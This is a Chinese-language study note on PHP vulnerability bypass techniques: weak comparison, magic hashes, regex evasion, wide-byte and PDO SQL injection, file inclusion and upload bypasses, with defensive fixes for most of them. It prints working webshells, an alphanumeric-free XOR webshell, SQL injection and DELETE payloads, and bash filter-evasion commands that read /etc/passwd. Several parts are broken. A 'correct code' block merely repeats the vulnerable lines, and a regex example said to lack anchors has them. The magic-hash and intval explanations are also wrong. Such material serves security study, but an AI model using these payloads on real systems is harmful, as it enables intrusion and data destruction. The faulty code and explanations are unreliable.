# 1. 前置基础

简单说一点，介绍两个概念，其他的关于PHP的基础知识见1.php基础学习

**WNMP**:<u>Windows(操作系统)、Nginx(web服务器)、MySQL(数据库)、PHP(脚本语言)</u>  

- **W - Windows**

表示运行在Windows操作系统上，与LNMP中的Linux对应。

# 2. 常见绕过技巧

## 2.1 弱类型与隐式转换绕过

### 2.1.1 == 弱类型比较绕过

**核心原理**

PHP 的 `==` 运算符在比较时会触发 Zend 引擎的自动类型转换。当两边类型不同时，PHP 会尝试将它们转换为相同类型再比较

**典型场景**

```php
if ($_GET['a'] == 1234) {
    echo "success";
}

```

**绕过方式：**

```
?a=1234     ✅ 正常匹配
?a=1234abc  ✅ 字符串转数字时，从左到右解析，遇到非数字字符停止
?a=00001234 ✅ 前导零被忽略
?a=1234e0   ✅ 科学计数法

```

### 2.1.2 hash弱比较绕过

> md5 、sha1 、 hash_hmac

**核心原理：**
当 MD5/SHA1 的哈希值恰好以 `0e` 开头且后续全是数字时，PHP 会将其解释为科学计数法（0 的 n 次方 = 0）

**典型场景：**

```php
if (md5($_GET['a']) == md5($_GET['b'])) {
    echo "success";
}

```

**防御：**

```php
// 方法1：使用严格比较
if (md5($_GET['a']) === md5($_GET['b'])) { ... }

// 方法2：使用 hash_equals()（PHP 5.6+）
if (hash_equals(md5($_GET['a']), md5($_GET['b']))) { ... }

```

### 2.1.3 数组绕过

**核心原理：**
许多 PHP 函数期望接收字符串参数，但当传入数组时会返回 `NULL` 或 `false`，配合弱比较可以绕过验证

**典型场景：**

```php
// strcmp() 绕过
if (!strcmp($_GET['password'], 'admin123')) {
    echo "login success";
}

```

**绕过方式：**

```
?password[]=anything

```

**可绕过原因：**

```php
strcmp(array(), 'admin123')  // 返回 NULL
!NULL == true  // 绕过验证

```

**受影响的函数：**

```
strcmp() / strcasecmp()  → 返回 NULL

md5() / sha1()           → 返回 NULL（传入数组时）

preg_match()             → 返回 false

```

**防御：**

```php
// 先验证类型
if (is_string($_GET['password']) && !strcmp($_GET['password'], 'admin123')) {
    echo "login success";
}

```

## 2.2 正则表达式与字符串检测绕过

### 2.2.1 preg_match() / ereg()绕过

- 1 **大小写绕过**

```php
// 未加 /i 修饰符
if (preg_match('/admin/', $_GET['user'])) {
    die("forbidden");
}

```

绕过：`?user=Admin` 或 `?user=ADMIN`

- 2 **换行符绕过(边界符缺陷)**

```php
// 缺少 ^ 和 $ 边界符
if (preg_match('/^admin$/', $_GET['user'])) {
    die("forbidden");
}

```

绕过：`?user=admin%0atest`

**可绕过原因：**

`^` 和 `$` 默认只匹配字符串的开头和结尾，但遇到换行符 `\n` 时，会被当作新的一行。如果没有使用 `/m` 多行模式，可以通过换行符插入额外内容

- 3 **极限回溯绕过** (Backtrack Limit)

```php
if (preg_match('/^[a-z]+$/', $_GET['input'])) {
    echo "valid";
}

```

**攻击方式：**

输入超长字符串（如 100 万个 'a'），耗尽 PCRE 引擎的回溯次数限制（默认 100 万次），导致 `preg_match()` 返回 `false`

```php
preg_match('/^[a-z]+$/', str_repeat('a', 1000000));  // 返回 false

```

**防御方式：**

```php
// 设置更大的回溯限制
ini_set('pcre.backtrack_limit', 10000000);

// 或先检查输入长度
if (strlen($_GET['input']) > 1000) {
    die("input too long");
}

```

### 2.2.2 函数返回值检测绕过

#### **strpos() / stripos() 绕过**

```php
// 错误写法
if (strpos($_GET['url'], 'http://') == false) {
    die("invalid url");
}

```

**绕过方式：**

```
?url=http://evil.com

```

**可绕过原因：**

`strpos()` 返回匹配位置，如果 `http://` 在字符串开头（位置 0），返回值是 `0`

```php
strpos('http://evil.com', 'http://') === 0
0 == false  // true（弱比较）

```

**正确写法：**

```php
strpos('http://evil.com', 'http://') === 0
0 == false  // true（弱比较）

```

#### **in_array() 绕过**

```php
// 未开启严格模式
$whitelist = array(1, 2, 3);
if (in_array($_GET['id'], $whitelist)) {
    echo "valid";
}

```

**绕过方式：**

```
?id=1abc

```

**可绕过原因：**

```php
in_array('1abc', array(1, 2, 3))  // true
// '1abc' 被转换为 1，匹配成功

```

**防御方式：**

```php
if (in_array($_GET['id'], $whitelist, true)) {  // 开启严格模式
    echo "valid";
}

```

## 2.3 数据验证与过滤规避

### 2.3.1 判空逻辑规避empty()

**核心原理：**
`empty()` 对"空"的定义非常宽泛，以下值都会被判定为空：

- `""` 空字符串
- `0` 整数 0
- `"0"` 字符串 "0"
- `0.0` 浮点数 0
- `false` 布尔值
- `[]` 空数组
- `NULL`

**典型场景:**

```php
if (!empty($_GET['id'])) {
    $id = $_GET['id'];
    // 执行数据库查询
}

```

**绕过方式：**

```
?id=0

```

**危险原因：**

```
在某些业务逻辑中，0 可能是合法的 ID 值，但 empty() 会将其判定为空，导致逻辑错误

```

**防御方法：**

```php
// 使用 isset() 配合类型检查
if (isset($_GET['id']) && $_GET['id'] !== '') {
    $id = intval($_GET['id']);
}

```

### 2.3.2 数字处理规避

#### is_numeric()绕过

```php
if (is_numeric($_GET['id'])) {
    $id = $_GET['id'];
    // 拼接 SQL
}

```

**绕过方式：**

- `?id=1e3`    ✅ 科学计数法（被解释为 1000）
- `?id=0x10`  ✅ 十六进制（被解释为 16）
- `?id=+123`  ✅ 带正号

**危险原因：**

`is_numeric('1e3')` 返回 `true`，但在 SQL 中可能被解释为字符串 `'1e3'` 而非数字 `1000`，导致逻辑混乱

#### intval()截断绕过

```php
$id = intval($_GET['id']);
if ($id == 1) {
    // 管理员权限
}

```

**绕过方式：**

```
?id=1abc

```

**可绕过原因：**

```
intval('1abc') === 1  // true

```

`intval()` 从左到右解析，遇到非数字字符停止，返回 `1`

### 2.3.3 编码与转义规避addslashes()

**宽字节注入**

```php
$name = addslashes($_GET['name']);
$sql = "SELECT * FROM users WHERE name = '$name'";

```

**攻击方式:**

```
?name=%df%27 OR 1=1--

```

**可绕过原因：**

1. `addslashes()` 将 `'` 转义为 `\'`（`%27` → `%5c%27`）
2. 攻击者输入 `%df%27`，经过转义变成 `%df%5c%27`
3. 在 GBK 编码中，`%df%5c` 被解释为一个汉字（運），剩下 `%27` 成为有效的单引号
4. 最终 SQL：`SELECT * FROM users WHERE name = '運' OR 1=1--'`

**防御方法：**

```php
// 方法1：使用 PDO 预处理
$stmt = $pdo->prepare("SELECT * FROM users WHERE name = ?");
$stmt->execute([$_GET['name']]);

// 方法2：统一字符集
mysqli_set_charset($conn, 'utf8mb4');

// 方法3：使用 mysqli_real_escape_string()
$name = mysqli_real_escape_string($conn, $_GET['name']);

```

## 2.4 包含与认证机制突破

### 2.4.1 文件包含绕过include()

**典型场景：**

```php
$page = $_GET['page'];
include($page . '.php');

```

**绕过技巧：**

在LFI的笔记有很多，这里提个00截断就行

**可绕过原因：**

```
在旧版本 PHP 中，%00（NULL 字节）会截断字符串，导致 .php 后缀被忽略

```

用伪协议读取，路径穿越也都可以

### 2.4.2 认证逻辑绕过password_verify()

**典型场景：**

```php
$hash = $row['password'];  // 从数据库读取
if (password_verify($_POST['password'], $hash)) {
    echo "login success";
}

```

**绕过方式(旧版本漏洞):**

```
在某些旧版本 PHP 中，如果 $hash 不是合法的哈希格式，password_verify() 可能返回意外结果

```

**案例：**

```php
// 如果数据库中的 hash 字段被污染为布尔值 true
password_verify('anything', true);  // 可能返回 true

```

**防御：**

```php
// 验证哈希格式
if (is_string($hash) && strlen($hash) === 60 && password_verify($_POST['password'], $hash)) {
    echo "login success";
}

```

# 3. 常见PHP函数漏洞及其成因

## 3.1 输入验证相关成因

### empty()

**设计缺陷：**

`empty()` 的设计初衷是检测"空"状态，但对"空"的定义过于宽泛，导致合法输入被误判

**危险场景：**

```php
if (!empty($_POST['amount'])) {
    $amount = $_POST['amount'];
    // 转账金额
}

```

如果用户输入 `amount=0`，会被 `empty()` 判定为空，导致转账 0 元的请求被拒绝（业务逻辑错误）

### isset()

**设计缺陷：**

`isset()` 只检查变量是否在符号表中存在，不关心其值是否合法

**危险场景：**

```php
if (isset($_GET['admin'])) {
    // 授予管理员权限
}

```

攻击者只需访问 `?admin=` 或 `?admin=0`，即可通过检查

### is_numeric() & intval()

**配合使用的危险：**

```php
if (is_numeric($_GET['id'])) {
    $id = intval($_GET['id']);
    $sql = "SELECT * FROM users WHERE id = $id";
}

```

**攻击方式：**

```
?id=1e3

```

- `is_numeric('1e3')` 返回 `true`
- `intval('1e3')` 返回 `1`
- 但在某些数据库中，`1e3` 可能被解释为 `1000`

## 3.2 字符串比较相关成因

### ==

**Zend 引擎的类型转换规则：**

1. 如果一边是数字，另一边是字符串，将字符串转为数字
2. 如果两边都是数字字符串，转为数字比较
3. 如果无法转换，按字符串比较

**危险案例：**

```php
if ($_GET['token'] == '123456') {
    // 授权访问
}

```

攻击者可以传入 `?token=123456abc`，绕过验证

## 3.3 加密与哈希相关成因

### md5() / sha1() / hash_hmac()

**底层原理：**
这些函数返回的是十六进制字符串。如果恰好以 `0e` 开头且后续全是数字，PHP 会将其解释为科学计数法

## 3.4 文件执行与相关成因

### include / require (LFI/RFI)

**底层设计缺陷：**
PHP 的 `include()` 函数只要文件中包含 `<?php` 标签，就会将其作为代码执行，完全不关心文件后缀。

**攻击案例：**

```php
include($_GET['file']);

```

攻击者上传一个名为 `shell.jpg` 的文件，内容为：

```php
<?php system($_GET['cmd']); ?>

```

然后访问：

```
?file=uploads/shell.jpg&cmd=ls

```

即可执行命令

### eval()

**底层原理：**
`eval()` 是语言构造器，直接将输入送入 PHP 编译器执行，没有任何过滤。

**危险场景：**

```php
eval($_GET['code']);

```

攻击者可以执行任意 PHP 代码：

```
?code=system('cat /etc/passwd');

```

### preg_replace() + /e   （PHP < 7）

**危险特性：**
`/e` 修饰符会将替换字符串当作 PHP 代码执行。

**攻击案例：**

```php
$text = preg_replace('/(.*)/e', $_GET['input'], 'test');

```

攻击者输入：

```
?input=system('whoami')

```

等价于执行：

```php
eval("system('whoami')");

```

**注意：** PHP 7 已废弃 `/e` 修饰符，使用 `preg_replace_callback()` 替代

## 3.5 文件上传与处理成因

### move_uploaded_file()

**函数本身安全，但业务逻辑不安全：**

```php
// 仅检查 MIME 类型
if ($_FILES['file']['type'] == 'image/jpeg') {
    move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);
}

```

**绕过方式：**

1. 修改 HTTP 请求头中的 `Content-Type: image/jpeg`
2. 上传 `shell.php`，服务器会保存为 `uploads/shell.php`
3. 访问 `uploads/shell.php` 执行 Webshell

**防御方法：**

```php
// 1. 检查文件扩展名白名单
$allowed = ['jpg', 'png', 'gif'];
$ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
if (!in_array(strtolower($ext), $allowed, true)) {
    die("invalid file type");
}

// 2. 重命名文件
$filename = md5(uniqid()) . '.' . $ext;
move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $filename);

// 3. 检查文件内容
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);
if (!in_array($mime, ['image/jpeg', 'image/png'], true)) {
    die("invalid file content");
}

```

### getimagesize() / exif_read_data()

**底层原理：**
这些函数只读取文件头部的 Magic Byte（魔术字节），不检查完整内容。

**绕过方式：**
创建一个文件 `shell.php`：

```php
GIF89a
<?php system($_GET['cmd']); ?>

```

前 6 个字节是 GIF 文件头，`getimagesize()` 会认为这是合法图片。

**防御方法：**

```php
// 使用 imagecreatefromjpeg() 等函数重新渲染图片
$img = imagecreatefromjpeg($_FILES['file']['tmp_name']);
if ($img === false) {
    die("invalid image");
}
imagejpeg($img, 'uploads/' . $filename);
imagedestroy($img);

```

## 3.6 变量与解析成因

### 3.6.1 变量覆盖漏洞

#### extract()

```php
$is_admin = false;
extract($_GET);
if ($is_admin) {
    // 管理员权限
}

```

**攻击方式：**

```
?is_admin=1

```

`extract()` 会将 `$_GET` 数组中的键值对转换为变量，覆盖 `$is_admin`。

---

#### parse_str()

```php
$is_admin = false;
parse_str($_SERVER['QUERY_STRING']);
if ($is_admin) {
    // 管理员权限
}

```

**攻击方式：**

```
?is_admin=1

```

---

#### $$ 动态变量

```php
$key = $_GET['key'];
$$key = $_GET['value'];

```

**攻击方式：**

```
?key=is_admin&value=1

```

等价于：

```
$is_admin = 1;

```

**防御方法：**

```php
// 永远不要直接使用 extract() 处理用户输入
// 如果必须使用，加上 EXTR_SKIP 参数
extract($_GET, EXTR_SKIP);  // 不覆盖已存在的变量

```

### 3.6.2 json_decode()漏洞

**精度丢失问题：**

```php
$data = json_decode('{"amount": 2e3}');
echo $data->amount;  // 输出 2000

```

如果业务逻辑期望 `amount` 是字符串 `"2e3"`，但 JSON 解析后变成了数字 `2000`，可能导致逻辑绕过。

**防御方法：**

```php
// 使用第二个参数 true，将对象转为关联数组
$data = json_decode($json, true);

// 或使用 JSON_BIGINT_AS_STRING 选项
$data = json_decode($json, false, 512, JSON_BIGINT_AS_STRING);

```

# 4. 进阶

## 4.1 命令执行过滤极限绕过

### 4.1.1无字母数字 Webshell

**原理：**
利用 PHP 的异或 `^`、取反 `~` 或自增运算符构造字符。

**示例1：异或构造**

```php
$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); // assert
$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); // _POST
$___=$$__;
$_($___[_]); // assert($_POST[_]);

```

访问：

```
POST: _=system('whoami');

```

**示例2：自增构造**

```php
$_=[];
$_=@"$_"; // Array 转字符串得到 "Array"
$_=$_['!'=='@']; // 取第0个字符 'A'
$___=$_; // $___='A'
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // 'A'+'S'='AS'
$___.=$__; // 继续拼接...
// 最终构造出 "ASSERT" 或 "SYSTEM"

```

### 4.1.2 Bash 截断与混淆

**绕过空格过滤：**

```bash
cat${IFS}/etc/passwd
cat$IFS$9/etc/passwd
cat</etc/passwd
{cat,/etc/passwd}

```

**绕过关键字过滤：**

```bash
c""at /etc/passwd
c'a't /etc/passwd
c\at /etc/passwd
c?t /etc/passwd  # ? 匹配单个字符

```

## 4.2 突破执行环境限制

### 4.2.3 Bypass disable_functions

**方法1：LD_PRELOAD 劫持**

原理：通过环境变量 `LD_PRELOAD` 加载恶意 `.so` 文件，劫持系统函数。

步骤：

1. 编写 C 代码，劫持 `getuid()` 等函数
2. 编译为 `.so` 文件
3. 通过 `mail()` 或 `error_log()` 等函数触发

### 4.3.2 PDO 预处理注入

**原理：**
当开启模拟预处理（`ATTR_EMULATE_PREPARES = true`）时，PDO 会在客户端拼接 SQL，而非真正的预处理。

**攻击场景：**

```php
$pdo->setAttribute(PDO::ATTR_EMULATE_PREPARES, true);
$pdo->exec("SET NAMES gbk");
$stmt = $pdo->prepare("SELECT * FROM users WHERE name = ?");
$stmt->execute([$_GET['name']]);

```

**攻击方式：**

```
?name=%df%27 OR 1=1--

```

**在 GBK 编码环境下的完整攻击流程：**

1. 攻击者输入：`%df%27 OR 1=1--`

2. PDO 在客户端进行转义（模拟预处理模式）：

   - `%27`（单引号）被转义为 `%5c%27`（`\'`）
   - 完整字符串变成：`%df%5c%27 OR 1=1--`

3. 数据库使用 GBK 编码解析：

   - `%df%5c` 被解释为一个汉字"運"（GBK 双字节字符）
   - 剩余的 `%27` 成为有效的单引号

4. 最终执行的 SQL：

   ```sql
   SELECT * FROM users WHERE name = '運' OR 1=1--'

   ```

5. 注入成功，返回所有用户数据

**可绕过原因：**

1. **模拟预处理的缺陷：**

   - `ATTR_EMULATE_PREPARES = true` 时，PDO 不是真正的预处理
   - 而是在 PHP 层面拼接 SQL 字符串，然后发送给数据库
   - 这个过程中会进行字符转义，但转义逻辑不理解多字节编码

2. **编码不一致：**

   - PHP 使用单字节逻辑处理字符串
   - 数据库使用 GBK 多字节编码解析
   - 导致 `\`（反斜杠）被"吞掉"

3. **堆叠注入的可能性：**
   在某些数据库配置下，还可以执行多条 SQL：

   ```
   ?name=%df%27;DELETE FROM users--

   ```

**防御方法：**

```php
// 方法1：关闭模拟预处理（推荐）
$pdo->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);

// 方法2：统一字符集为 UTF-8
$pdo->exec("SET NAMES utf8mb4");

// 方法3：在 DSN 中指定字符集
$pdo = new PDO(
    'mysql:host=localhost;dbname=test;charset=utf8mb4',
    'user',
    'password',
    [PDO::ATTR_EMULATE_PREPARES => false]
);

// 方法4：使用 mysqli 的真预处理
$stmt = $mysqli->prepare("SELECT * FROM users WHERE name = ?");
$stmt->bind_param("s", $_GET['name']);
$stmt->execute();

```

**真预处理 vs 模拟预处理对比：**

| 特性         | 真预处理               | 模拟预处理 |
| ------------ | ---------------------- | ---------- |
| SQL 拼接位置 | 数据库服务器           | PHP 客户端 |
| 参数传递方式 | 二进制协议             | 字符串拼接 |
| 编码问题     | 不存在                 | 可能被绕过 |
| 性能         | 更快（可缓存执行计划） | 较慢       |
| 安全性       | 更高                   | 较低       |

**实战检测方法：**

```php
// 检测当前是否使用模拟预处理
var_dump($pdo->getAttribute(PDO::ATTR_EMULATE_PREPARES));
// true = 模拟预处理（危险）
// false = 真预处理（安全）

// 检测数据库字符集
$result = $pdo->query("SHOW VARIABLES LIKE 'character_set%'");
print_r($result->fetchAll());

```
